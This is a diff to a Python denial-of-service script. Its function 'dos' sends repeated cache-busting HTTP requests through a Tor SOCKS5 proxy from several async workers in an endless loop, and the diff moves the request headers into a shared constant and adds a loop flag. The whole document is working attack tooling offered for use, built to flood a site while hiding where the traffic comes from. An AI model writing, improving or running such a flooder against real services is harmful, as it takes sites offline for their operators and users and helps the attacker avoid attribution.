@@ -13,10 +13,22 @@ from stem.control import Controller
 from argparse import Namespace
 
 
-__all__ = ['URL', 'PROXY_HOST', 'PROXY_PORT', 'WORKERS', 'dos', 'runner', 'pool']
+__all__ = [
+    'URL', 'HEADER', 'PROXY_HOST',
+    'PROXY_PORT', 'WORKERS', 'dos',
+    'runner', 'pool'
+]
 
 
 URL = 'https://ident.me'
+
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
+    'Connection:': 'keep-alive',
+    'Cache-Control': 'no-cache, no-store, must-revalidate',
+    'Pragma': 'no-cache',
+    'Expires': '0'
+}
 
 PROXY_HOST = 'localhost'
 
@@ -25,8 +37,8 @@ PROXY_PORT = 9050
 WORKERS = 8
 
 
-async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
-    while True:
+async def dos(url: str, proxy_host: str, proxy_port: str, worker: int, loop: bool = True):
+    while loop:
         # Proxy
         connector = ProxyConnector(
             proxy_type=ProxyType.SOCKS5,
@@ -39,17 +51,10 @@ async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
         # HTTP session
         session = ClientSession(connector=connector)
 
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
-            'Connection:': 'keep-alive',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Pragma': 'no-cache',
-            'Expires': '0'
-        }
-
         for index in range(8):
-            async with session.get(url, headers=headers) as response:
-                print(f'#{worker + 1} Worker | Request has a {response.status} status code')
+            async with session.get(url, headers=HEADERS) as response:
+                print(
+                    f'#{worker + 1} Worker | Request has a {response.status} status code')
 
         await session.close()
 
